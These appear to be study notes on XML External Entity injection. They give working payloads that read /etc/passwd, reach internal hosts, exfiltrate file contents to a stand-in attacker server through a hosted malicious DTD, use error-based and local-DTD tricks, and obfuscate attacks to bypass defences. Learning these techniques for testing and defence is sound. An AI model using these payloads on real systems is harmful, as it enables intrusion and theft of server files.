## What is XML?

- **extensible markup language**
- XML entities - represents an item of data within an XML document instead of using the data itself
- Document Type Definition (DTD) - declarations that can define the structure of an XML document, the types of data values it can contain, and other items

  - declared within the optional `DOCTYPE` element at the start of XML document
  - Internal DTD - fully self-contained within the document itself
  - External DTD - loaded from somewhere else

- XML custom entities
  eg - `<!DOCTYPE foo [ <!ENTITY myentity "my entity value">]>`

  - any usage of the entity reference `&myentity;` within the XML document will be replaced with the defined value `my entity value`

- XML external entities - type of custom entity whose definition is located outside of the DTD where they are declared
  - declaration of an external entity uses the `SYSTEM` keyword and must specify a URL from which the value of the entity should be loaded
  - eg - `<!DOCTYPE foo [<!ENTITY ext SYSTEM "http://normal-website.com" >]>`
  - `<!DOCTYPE foo [<!ENTITY ext SYSTEM "file:///path/to/file" >]>`

## XML External Entity Injection (XXE)

- interfere with an application's processing of XML data
- often allows an attacker to view files on the application server filesystem, and to interact with any backend or external systems that the appliation itself can access
- leveraging the XXE vulnerability to perform SSRF attacks

## How?

- some applications use the XML format to transmit data between the browser and server
- XML specification contains various potentially dangerous features and standard parsers support these features even if they are not normally used by the application

## Types of XXE attacks

1. **Exploiting XXE to retrieve files** - external entity is defined containing the contents of a file, and returned in the application's response
2. **Exploiting XXE to perform SSRF attacks** - external entity is defined based on a URL to a back-end system
3. **Blind XXE**
   - **Exploiting blind XXE exfiltrate data out-of-band** - sensitive data is transmitted from the application server to a system that the attacker controls
   - **Exploiting blind XXE to retrieve data via error messages** - the attacker can trigger a parsing error message containing sensitive data

### 1) Exploiting XXE to retrieve files

- need to modify the submitted XML in two ways:
  - introduce or edit a `DOCTYPE` element that defines an external entity containing the path to the file
  - edit a data value in the XML that is returned in the application's response, to make use of the defined external entity

eg - shopping application checks for the stock level of a product by submitting the following XML to the server

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>381</productId>
</stockCheck>
```

- you can exploit the XXE vulnerability to retrieve the `/etc/passwd` file by submitting the following XXE payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<stockCheck>
    <productId>&xxe;</productId>
</stockCheck>
```

- XXE payload defines an external entity `&xxe;` whose value is the contents of the `/etc/passwd` file and uses the entity within the productId value.

### 2) Exploiting XXE to perform SSRF attacks

- define an external XML entity using the URL that you want to target
- use the defined entity within a data value
- if it is returned in the application's response, you will be able to view the response from the URL within the applications' response, and gain two-way interaction with the back-end system
- else perform blind SSRF attacks

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

### 3) Exploiting blind XXE

- Blind XXE - arise where the application is vulnerable to XXE injection but does not return the values fo any defined external entities within its responses

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

- this XXE attack causes the server to make a back-end HTTP request to the specified URL and attacker can monitor for the resulting DNS lookup and HTTP request, and detect that the XXE attack was successful

- sometimes, XXE attacks using regular entities are blocked, by some input validation by the application or some hardening of the XML parser

  - use XML parameter entities - special kind of XML entity which can only be referenced elsewhere within the DTD

  - first declare an XML parameter entity include the `%` character before the entity name

  ```
  <!ENTITY % parametername "parameter value" >
  ```

  - second, parameter entities are referenced using the `%` character instead of the usual `&`

  ```
  %parametername
  ```

  eg -

  ```xml
  <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
  ```

#### Exploiting blind XXE exfiltrate data out-of-band

- example of the malicious DTD to exfiltrate the contents of /etc/passwd file as follows;

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

- Defines an XML parameter entity called `file`, containing the contents of `/etc/passwd`
- Defines an XML parameter entity called `eval`, containing a dynamic declaration of another XML parameter entity called `exfiltrate`. The `exfiltrate` entity will be evaluated by making an HTTP request to the attacker's web server containing the value of the file entity within the URL query string
- Uses the `eval` entity , which causes the dynamic declaration of the `exfiltrate` entity to be performed
- Uses the `exfiltrate` entity; so that its value is evaluated by requesting the specified URL

The attacker must host the malicious DTD on a system that they control, and submit the following XXE payload to the vulnerable application

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd"> %xxe; ]>
```

- XXE payload declares an XML parameter entity called `xxe` and uses the entity within the DTD. This will cause the XML parser to fetch the external DTD from the attacker's server and interpret it inline.

#### Exploting blind XXE to retrieve data via error messages

- can trigger an XML parsing error message containing the contents of the `/etc/passwd` file using a malicious external DTD as

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///notexist/%file;'>">
%eval;
%error;
```

#### Exploiting blind XXE by repurposing a local DTD

- if out of band interactions are blocked, you can't load an external DTD from a remote server
- suppose there is a DTD file on the server filesystem at the location `/usr/local/app/schema.dtd` and this DTD file defines an entity called `custom_entity`
- attacker can trigger an XML parsing error message containing the contents of the `/etc/passwd` file by submitting a hybrid DTD like the following:

```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
  <!ENTITY % custom_entity '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///noexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
```

`&#x25` -> `%`  
`&#x26` -> `&`  
`&#x27` -> `'`

1. Defines an XML parameter entity called `local_dtd` containing the contents of the external DTD file that exists on the server filesystem
2. Redefines the XML parameter entity called `custom_entity` which is already defined in the external DTD file
3. Uses the `local_dtd` entity, and external DTD is interpreted including the redefined value of the `custom_entity` entity
4. Desired error message will get.

> How to Locate an existing DTD file to repurpose

- linux systems using the GNOME desktop environment often have a DTD file at `/usr/share/yelp/dtd/docbookx.dtd`
- test whether this file is present by submitting the following XXE payload, which will cause an error if the file is missing

```xml
<!DOCTYPE foo[
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  %local_dtd;
]>
```

## Finding hidden attack surface for XXE injection

- attack surface for XXE injection is obvious in many cases
- in some cases, the attack surface is less visible, but looking in the right places, it can be found XXE attack surface in requests that do not contain any XML

### XInclude attacks

- some applications receive client-submitted data, embed it on the server-side into an XML document and then parse the document
- eg - SOAP request
- you can't carry out a classic XXE attack as you can't define or modify the `DOCTYPE` element
- but you might be able to use `XInclude`
- `XInclude` - part of XML specification that allows an XML document to be built from sub-documents
- you can place an XInclude attack within any data value in an XML document, and the attack can be performed in situations where you can only control a single item of data that is placed into a server-side XML document

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

### XXE attacks via file upload

- example of XML-based formats are DOCX and SVG
- an application might allow users to uplaod images and process or validate those on the server after uploading
- (even if the app expects to receive a format like PNG or JPEG), the image processing library that is being used might support SVG images
- SVG format uses XML
- attacker can submit a malicious SVG image and reach hidden attack surface for XXE

### XXE attacks via modified content type

- most POST requests use a default content type such as `application/x-www-form-urlencoded`
- eg -

```
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

- you can submit the following request with the same request

```
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```

- if the application tolerates requests containing XML in the message body, and parses the body content as XML, then you can reach the hidden XXE attack surface by reformatting requests to use the XML format

---

## How to find and test for XXE vulnerabilities

- Testing for file retrieval by defining an external entity based on a well-known operating system file and using that entity in data that is returned in the application's response

- Testing for blind XXE vulns by defining an external entity based on a URL to a system that you control, and monitoring for interactions with that system

- Testing for vulnerable inclusion of user-supplied non-XML data within a server-side XML document by using an XInclude attack to try to retrieve a well-known operating system file

> Keep in mind that XML is just a data transfer format. Make sure you also test any XML-based functionality for other vulnerabilities like XSS and SQL injection. You may need to encode your payload using XML escape sequences to avoid breaking the syntax, but you may also be able to use this to obfuscate your attack in order to bypass weak defences.
